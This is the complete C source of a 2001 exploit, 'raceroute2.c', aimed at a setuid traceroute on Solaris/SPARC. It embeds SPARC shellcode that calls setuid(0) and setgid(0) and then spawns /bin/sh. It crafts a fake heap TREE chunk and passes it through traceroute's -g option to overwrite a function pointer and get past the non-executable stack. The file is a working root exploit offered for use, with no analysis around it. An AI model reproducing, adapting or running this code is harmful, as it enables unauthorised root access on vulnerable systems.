/*
 * Created: September 3, 2001
 * Updated: September 4, 2001
 *   ______
 *  /   ___\ __ _  ____  ____  ____ ____ ____  __ _
 *  \____  \/  / \/    \/    \/  _ \    \ _  \/  / \
 * /        \___  \  \  \  \  \ ___/  \_/___  \___  \
 * \______  / ____/__/  /__/  /___ \__/ / ____/ ____/
 *        \/\/        \/    \/    \/    \/    \/
 *
 * raceroute2.c versus Solaris/Sparc traceroute
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF SYNNERGY
 * Copyright (C) 2001 MaXX <maxx@synnergy.net>
 *
 * Unlike raceroute.c, the present exploit bypasses the
 * noexec_user_stack protection (see deadlock2.c for more information).
 *
 * -- MaXX
 */

#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define WORDSIZE sizeof(WORD)
#define ALIGN 8
typedef union _w_ {
    size_t w_i;
    struct _t_ * w_p;
    char w_a[ ALIGN ];
} WORD;
typedef struct _t_ {
    WORD t_s;
    WORD t_p;
    WORD t_l;
    WORD t_r;
    WORD t_n;
    WORD t_d;
} TREE;
#define SIZE( b ) ( ((b)->t_s).w_i )
#define LEFT( b ) ( ((b)->t_l).w_p )
#define LINKFOR( b ) ( ((b)->t_n).w_p )
#define LINKBAK( b ) ( ((b)->t_p).w_p )
#define SETNOTREE( b ) ( LEFT(b) = (TREE *)(-1) )
#define BIT0 (01)
#define BIT1 (02)

char shellcode[] =
    /* setuid( 0 ); */
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x08"
    /* setgid( 0 ); */
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x08"
    /* execve( "/bin/sh", {"/bin/sh", NULL}, NULL ); */
    "\x31\x0b\xd8\x9a\xb0\x16\x21\x6e\x33\x0b\xdc\xda\x90\x13\x80\x0e"
    "\x92\x03\xa0\x08\x94\x1b\x80\x0e\x9c\x03\xa0\x10\xf0\x23\xbf\xf0"
    "\xf2\x23\xbf\xf4\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b"
    "\x91\xd0\x20\x08\x90\x10\x20\x2a\x82\x10\x20\x01\x91\xd0\x20\x08"
    /* call */
    "\x7f\xff\xff\xe8\x01nop";
#define CALL_SIZE 8

#define TREE_KEY "TREE"
#define DUMMY_G "123"
#define G_OPTION "-g"
#define DUMMY_BYTE 0x42
#define DUMMY_SIZE 0xdefaced
#define BLOCK ( 0x26158 - WORDSIZE )
#define NEXT_BLOCK ( BLOCK + sizeof(TREE) + sizeof(shellcode)-1 )
#define CODE_ADDRESS ( NEXT_BLOCK - CALL_SIZE )
#define FUNCTION_POINTER 0xff23824c
#define DUMMY_ALIGNMENT ""
#define TRACEROUTE "/v07/p2001/kaempfm1/traceroute-1.4a5/traceroute"

/* alignment() */
int alignment( void * pointer )
{
    return( (size_t)pointer % ALIGN );
}

/* nul() */
int nul( void * pointer )
{
    int i;

    for ( i = 0; i < sizeof(pointer); i++ ) {
        if ( ((char *)(&pointer))[i] == '\0' ) {
            return( -1 );
        }
    }
    return( 0 );
}

/* main() */
int main( int argc, char * argv[], char * envp[] )
{
    char * p_tree;

    p_tree = getenv( TREE_KEY );
    if ( p_tree == NULL ) {
        WORD t_s;
        char * p;
        char g[ sizeof(TREE)-WORDSIZE + sizeof(shellcode)-1 + WORDSIZE ];
        char tree[ sizeof(TREE) + 1 ];
        size_t size;
        int i;
        char ** execve_envp;
        char * execve_argv[] =
            { NULL, G_OPTION, g, G_OPTION, DUMMY_G, G_OPTION, DUMMY_G, NULL };

        memset( &t_s, DUMMY_BYTE, WORDSIZE-1 );
        ( (char *)(&t_s) )[ WORDSIZE-1 ] = '\0';
        t_s.w_i = (size_t)( DUMMY_SIZE );

        p = g;
        memcpy( p, DUMMY_G" ", sizeof(DUMMY_G) );
        p += sizeof(DUMMY_G);
        memset( p, DUMMY_BYTE, sizeof(TREE)-WORDSIZE - sizeof(DUMMY_G) );
        p += sizeof(TREE)-WORDSIZE - sizeof(DUMMY_G);
        memcpy( p, shellcode, sizeof(shellcode)-1 );
        p += sizeof(shellcode)-1;
        memcpy( p, &t_s, WORDSIZE );

        memset( tree, DUMMY_BYTE, sizeof(TREE) );
        tree[ sizeof(TREE) ] = '\0';
        SIZE( (TREE *)tree ) = (size_t)( (-WORDSIZE & ~BIT0) & ~BIT1 );
        LINKBAK( (TREE *)tree ) = (TREE *)( CODE_ADDRESS );
        SETNOTREE( (TREE *)tree );
        LINKFOR((TREE *)tree) = (TREE *)(FUNCTION_POINTER-offsetof(TREE,t_p));

        size = 1 + 1;
        for ( i = 0; i < sizeof(tree); i++ ) {
            if ( tree[i] == '\0' ) {
                size++;
            }
        }

        execve_envp = malloc( (size + 1) * sizeof(char *) );
        if ( execve_envp == NULL ) {
            return( -1 );
        }
        i = 0;
        execve_envp[ i++ ] = DUMMY_ALIGNMENT;
        execve_envp[ i++ ] = TREE_KEY"=";
        for ( p = tree; i < size; p += strlen(p)+1 ) {
            execve_envp[ i++ ] = p;
        }
        execve_envp[ i ] = NULL;

        execve_argv[ 0 ] = argv[ 0 ];
        execve( execve_argv[0], execve_argv, execve_envp );
        return( -1 );
    } else {
        if ( alignment(p_tree+1) || nul(p_tree+1 - (NEXT_BLOCK + WORDSIZE)) ) {
            size_t size;
            char * p_alignment;

            size = strlen( envp[0] ) + 1;
            p_alignment = malloc( size + 1 );
            if ( p_alignment == NULL ) {
                return( -1 );
            }
            memset( p_alignment, DUMMY_BYTE, size );
            p_alignment[ size ] = '\0';
            envp[ 0 ] = p_alignment;

            execve( argv[0], argv, envp );
            return( -1 );
        } else {
            size_t size;

            size = (size_t)p_tree+1 - ( NEXT_BLOCK + WORDSIZE );
            size = ( size | BIT0 ) & ~BIT1;
            memcpy( argv[2] + sizeof(TREE)-WORDSIZE + sizeof(shellcode)-1,
                &size, sizeof(size) );

            argv[ 0 ] = TRACEROUTE;
            execve( argv[0], argv, envp );
            return( -1 );
        }
    }
    return( -1 );
}

